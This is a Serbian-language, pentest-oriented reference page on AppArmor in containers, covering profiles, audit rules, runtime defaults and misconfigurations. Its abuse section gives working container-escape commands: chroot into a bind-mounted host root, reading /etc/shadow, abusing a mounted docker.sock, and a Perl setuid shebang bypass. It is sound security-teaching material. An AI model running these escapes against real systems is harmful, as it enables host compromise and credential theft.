# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

AppArmor je sistem **Obavezne kontrole pristupa** koji primenjuje ograničenja putem profila po programu. Za razliku od tradicionalnih DAC provera, koje u velikoj meri zavise od vlasništva korisnika i grupe, AppArmor omogućava kernelu da sprovede politiku vezanu za sam proces. U okruženjima sa kontejnerima, ovo je važno jer workload može imati dovoljno tradicionalnih privilegija da pokuša neku akciju, a ipak mu bude odbijeno jer njegov AppArmor profil ne dozvoljava odgovarajuću putanju, mount, mrežno ponašanje ili korišćenje capability-ja.

Najvažnija konceptualna tačka je da je AppArmor **baziran na putanjama**. On razmatra pristup fajl sistemu putem pravila o putanjama umesto kroz labels kao što radi SELinux. To ga čini pristupačnim i moćnim, ali isto tako znači da bind mounts i alternativni rasporedi putanja zaslužuju posebnu pažnju. Ako isti sadržaj hosta postane dostupan pod drugačijom putanjom, efekat politike možda neće biti onakav kakav je operater prvobitno očekivao.

## Uloga u izolaciji kontejnera

Pregledi bezbednosti kontejnera često se zaustave na capabilities i seccomp, ali AppArmor ostaje važan i nakon tih provera. Zamislite kontejner koji ima više privilegija nego što bi trebalo, ili workload kojem je zbog operativnih razloga bila potrebna jedna dodatna capability. AppArmor i dalje može da ograniči pristup fajlovima, ponašanje mount-a, mrežu i obrasce izvršavanja na načine koji zaustavljaju očigledan put zloupotrebe. Zato onemogućavanje AppArmor-a "samo da bi aplikacija radila" može neprimetno pretvoriti rizičnu konfiguraciju u onu koja je aktivno eksploatabilna.

## Laboratorija

Da biste proverili da li je AppArmor aktivan na hostu, koristite:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Da biste videli pod čime se pokreće trenutni container process:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Razlika je poučna. U normalnom slučaju, proces bi trebalo da prikaže AppArmor kontekst povezan sa profilom koji runtime izabere. U unconfined slučaju, taj dodatni sloj ograničenja nestaje.

Takođe možete proveriti šta Docker misli da je primenio:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Korišćenje u runtime-u

Docker može primeniti podrazumevani ili prilagođeni AppArmor profil kada host to podržava. Podman se takođe može integrisati sa AppArmor na sistemima zasnovanim na AppArmor, iako na distribucijama koje prioritizuju SELinux drugi MAC sistem često preuzme glavnu ulogu. Kubernetes može izložiti AppArmor politiku na nivou workload-a na čvorovima koji zaista podržavaju AppArmor. LXC i srodna system-container okruženja iz familije Ubuntu takođe široko koriste AppArmor.

Praktično gledano, AppArmor nije "Docker feature". To je host-kernel funkcionalnost koju različiti runtimes mogu izabrati da primene. Ako host to ne podržava ili je runtime naloženo da radi unconfined, navodna zaštita zapravo ne postoji.

Što se tiče Kubernetes-a, moderna API je `securityContext.appArmorProfile`. Od Kubernetes `v1.30`, starije beta AppArmor anotacije su deprecated. Na podržanim hostovima, `RuntimeDefault` je podrazumevani profil, dok `Localhost` upućuje na profil koji mora već biti učitan na čvoru. Ovo je važno pri reviziji jer manifest može delovati AppArmor-svestan, a ipak u potpunosti zavisi od podrške na strani čvora i prethodno učitanih profila.

Jedna suptilna ali korisna operativna pojedinost je da eksplicitno postavljanje `appArmorProfile.type: RuntimeDefault` predstavlja strožu politiku nego jednostavno izostavljanje tog polja. Ako je polje eksplicitno postavljeno i čvor ne podržava AppArmor, admission bi trebalo da odbije zahtev. Ako je polje izostavljeno, workload i dalje može pokrenuti na čvoru bez AppArmor i jednostavno neće dobiti taj dodatni nivo ograničenja. Sa stanovišta napadača, ovo je dobar razlog da se provere i manifest i stvarno stanje čvora.

Na hostovima koji podržavaju Docker i AppArmor, najpoznatiji podrazumevani profil je `docker-default`. Taj profil se generiše iz Moby-jevog AppArmor template-a i važan je jer objašnjava zašto neki PoC-ovi zasnovani na capability-ima i dalje ne uspevaju u podrazumevanom containeru. U širokim crtama, `docker-default` dozvoljava uobičajeno umrežavanje, zabranjuje upise u veći deo `/proc`, zabranjuje pristup osetljivim delovima `/sys`, blokira mount operacije i ograničava ptrace tako da on nije opšta primitivna tehnika sondiranja hosta. Razumevanje te osnovne postavke pomaže da se razlikuje "kontejner ima `CAP_SYS_ADMIN`" od "kontejner zapravo može iskoristiti tu capability protiv kernel interfejsa koji su mi bitni".

## Upravljanje profilima

AppArmor profili se obično čuvaju pod `/etc/apparmor.d/`. Uobičajena konvencija imenovanja je da se kosa crta u putanji izvršnog fajla zameni tačkama. Na primer, profil za `/usr/bin/man` je često smešten kao `/etc/apparmor.d/usr.bin.man`. Ova pojedinost je važna i za odbranu i za procenu jer, kad jednom znate aktivno ime profila, često brzo možete pronaći odgovarajući fajl na hostu.

Korisne komande za upravljanje na strani hosta uključuju:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Razlog zbog kojeg su ove komande važne u referenci za container-security je što objašnjavaju kako se profili zapravo grade, učitavaju, prebacuju u complain mode i menjaju nakon promena u aplikaciji. Ako operator ima naviku da tokom rešavanja problema prebacuje profile u complain mode i zaboravlja da vrati enforcement, kontejner može izgledati zaštićen u dokumentaciji, dok se u stvarnosti ponaša mnogo labavije.

### Izgradnja i ažuriranje profila

`aa-genprof` može posmatrati ponašanje aplikacije i pomoći pri interaktivnom generisanju profila:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` može da generiše predložak profila koji se kasnije može učitati pomoću `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Kada se binarni fajl promeni i politika treba ažuriranje, `aa-logprof` može ponovo reproducirati odbijanja pronađena u logovima i pomoći operatoru da odluči da li da ih dozvoli ili odbije:
```bash
sudo aa-logprof
```
### Logovi

Odbijanja AppArmor-a se često vide kroz `auditd`, syslog, ili alate kao što je `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Ovo je korisno u operativne i ofanzivne svrhe. Odbrambeni timovi ga koriste da unaprede profile. Napadači ga koriste da saznaju tačno koji put ili operacija se odbija i da li AppArmor predstavlja kontrolu koja blokira exploit chain.

### Identifikacija tačne datoteke profila

Kada runtime prikaže određeno AppArmor ime profila za container, često je korisno povezati to ime sa datotekom profila na disku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Ovo je naročito korisno tokom pregleda na hostu jer premošćava jaz između "the container says it is running under profile `lowpriv`" i "the actual rules live in this specific file that can be audited or reloaded".

### Ključna pravila za reviziju

When you can read a profile, do not stop at simple `deny` lines. Several rule types materially change how useful AppArmor will be against a container escape attempt:

- `ux` / `Ux`: izvršava ciljni binarni fajl bez ograničenja. Ako je pod `ux` dozvoljen pristupačan pomoćni program, shell ili interpreter, to je obično prva stvar koju treba testirati.
- `px` / `Px` i `cx` / `Cx`: vrše promene profila pri exec. Ovo nije automatski loše, ali vredi proveriti jer prelazak može završiti u znatno širem profilu nego trenutni.
- `change_profile`: omogućava procesu da pređe u drugi učitani profil, odmah ili pri sledećem exec. Ako je ciljni profil slabiji, ovo može postati predviđeni izlaz iz restriktivnog domena.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: ovo treba da promeni koliko poverenja ukazujete profilu. `complain` beleži odbijanja umesto da ih sprovodi, `unconfined` uklanja granicu, a `prompt` zavisi od odluke u korisničkom prostoru umesto čistog kernel-om nametnutog odbijanja.
- `userns` or `userns create,`: novija AppArmor politika može posredovati pri kreiranju user namespaces. Ako kontejner profil eksplicitno dozvoljava, ugnježdene user namespaces ostaju moguće čak i kada platforma koristi AppArmor kao deo svoje strategije hardeninga.

Korisno grep na hostu:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ovakav audit je često korisniji nego buljenje u stotine običnih file pravila. Ako breakout zavisi od izvršavanja helper-a, ulaska u novi namespace, ili bekstva u manje restriktivni profil, odgovor je često skriven u pravilima usmerenim na te tranzicije, a ne u očiglednim linijama tipa `deny /etc/shadow r`.

## Pogrešne konfiguracije

Najočiglednija greška je `apparmor=unconfined`. Administratori ga često postave tokom debugovanja aplikacije koja je zakazala zato što je profil ispravno blokirao nešto opasno ili neočekivano. Ako zastavica ostane u produkciji, ceo MAC sloj je efektivno uklonjen.

Još jedan suptilan problem je pretpostavka da su bind mounts bezopasni zato što dozvole fajlova izgledaju normalno. Pošto je AppArmor baziran na putanjama, izlaganje host paths pod alternativnim mount lokacijama može loše da interaguje sa path rules. Treća greška je zaboraviti da ime profila u config file znači vrlo malo ako host kernel zapravo ne nameće AppArmor.

## Zloupotreba

Kada AppArmor nestane, operacije koje su prethodno bile ograničene mogu iznenada početi da rade: čitanje osetljivih putanja preko bind mounts, pristup delovima procfs ili sysfs koji bi trebalo da ostanu teže dostupni, izvršavanje radnji vezanih za mount ako capabilities/seccomp to takođe dozvoljavaju, ili korišćenje putanja koje bi profil inače odbio. AppArmor je često mehanizam koji objašnjava zašto pokušaj breakout-a zasnovan na capabilities "trebao bi raditi" na papiru ali i dalje ne uspeva u praksi. Uklonite AppArmor, i isti pokušaj može početi da uspeva.

Ako sumnjate da je AppArmor glavni razlog zbog kog je zaustavljen path-traversal, bind-mount, ili mount-based abuse lanac, prvi korak je obično da uporedite šta postaje dostupno sa profilom i bez profila. Na primer, ako je host path montiran unutar container-a, počnite proverom da li možete da traversirate i pročitate ga:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ako kontejner takođe ima opasnu capability kao što je `CAP_SYS_ADMIN`, jedan od najpraktičnijih testova je da li AppArmor predstavlja kontrolu koja blokira mount operacije ili pristup osetljivim kernel datotečnim sistemima:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
U okruženjima gde je host path već dostupan putem bind mount-a, gubitak AppArmor-a takođe može pretvoriti read-only information-disclosure problem u direktan pristup fajlovima na hostu:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Poenta ovih komandi nije da AppArmor sam stvara breakout. Poenta je da, kada se AppArmor ukloni, mnogi filesystem i mount-based putevi zloupotrebe postanu odmah testabilni.

### Potpun primer: AppArmor Disabled + Host Root Mounted

Ako kontejner već ima host root bind-mounted na `/host`, uklanjanje AppArmor-a može pretvoriti blokiran filesystem abuse path u potpun host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Kada se shell izvršava kroz host filesystem, workload je efektivno pobegao iz granica containera:
```bash
id
hostname
cat /etc/shadow | head
```
### Kompletan primer: AppArmor onemogućen + Runtime socket

Ako je stvarna barijera bio AppArmor koji štiti runtime state, montiran socket može biti dovoljan za complete escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Tačan put zavisi od tačke montiranja, ali krajnji rezultat je isti: AppArmor više ne sprečava pristup runtime API-ju, i runtime API može pokrenuti container koji kompromituje host.

### Potpun primer: Path-Based Bind-Mount Bypass

Pošto je AppArmor baziran na putanjama, zaštita `/proc/**` ne štiti automatski isti host procfs sadržaj kada je dostupan kroz drugu putanju:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Uticaj zavisi od toga šta je tačno mounted i da li alternativni put takođe zaobilazi druge kontrole, ali ovaj obrazac je jedan od najozbiljnijih razloga zbog kojih AppArmor treba procenjivati zajedno sa mount layout, a ne izolovano.

### Potpuni primer: Shebang Bypass

AppArmor policy ponekad cilja interpreter path na način koji ne uzima u potpunosti u obzir izvršavanje script-a kroz shebang handling. Istorijski primer uključivao je korišćenje script-a čija prva linija pokazuje na confined interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ovakav primer je važan podsetnik da se namera profila i stvarna semantika izvršavanja mogu razlikovati. Prilikom pregleda AppArmor-a u container okruženjima, lanci interpretera i alternativni putevi izvršavanja zaslužuju posebnu pažnju.

## Provere

Cilj ovih provera je brzo odgovoriti na tri pitanja: da li je AppArmor omogućen na hostu, da li je trenutni proces ograničen, i da li je runtime zaista primenio profil na ovaj container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Šta je zanimljivo ovde:

- Ako `/proc/self/attr/current` prikazuje `unconfined`, radno opterećenje ne koristi AppArmor ograničenje.
- Ako `aa-status` prikazuje AppArmor onemogućen ili nije učitan, bilo koje ime profila u runtime konfiguraciji je uglavnom kozmetičko.
- Ako `docker inspect` prikazuje `unconfined` ili neočekivani custom profile, to je često razlog zašto putanja zloupotrebe zasnovana na filesystem-u ili mount-u funkcioniše.
- Ako `/sys/kernel/security/apparmor/profiles` ne sadrži profil koji ste očekivali, runtime ili konfiguracija orchestratora sama po sebi nije dovoljna.
- Ako navodno ojačan profil sadrži `ux`, široke `change_profile`, `userns`, ili `flags=(complain)` tip pravila, praktična granica može biti znatno slabija nego što ime profila sugeriše.

Ako kontejner već ima povišene privilegije iz operativnih razloga, ostavljanje AppArmor-a omogućenim često pravi razliku između kontrolisanog izuzetka i mnogo šire sigurnosne propasti.

## Podrazumevana podešavanja runtime-a

| Runtime / platform | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano omogućen na AppArmor-capable hostovima | Koristi `docker-default` AppArmor profil osim ako nije nadjačan | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zavisi od hosta | AppArmor je podržan kroz `--security-opt`, ali tačan default zavisi od hosta/runtime-a i manje je univerzalan od Docker-ovog dokumentovanog `docker-default` profila | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Uslovno podrazumevano | Ako `appArmorProfile.type` nije specificiran, default je `RuntimeDefault`, ali se primenjuje samo kada je AppArmor omogućen na čvoru | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` sa slabim profilom, čvorovi bez podrške za AppArmor |
| containerd / CRI-O under Kubernetes | Prati podršku čvora/runtime-a | Uobičajeni runtime-ovi podržani od strane Kubernetes-a podržavaju AppArmor, ali stvarno sprovođenje i dalje zavisi od podrške čvora i podešavanja workload-a | Isto kao u Kubernetes redu; direktna runtime konfiguracija takođe može potpuno zaobići AppArmor |

Za AppArmor, najvažnija varijabla je često **host**, a ne samo runtime. Podešavanje profila u manifestu ne stvara ograničenje na čvoru gde AppArmor nije omogućen.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
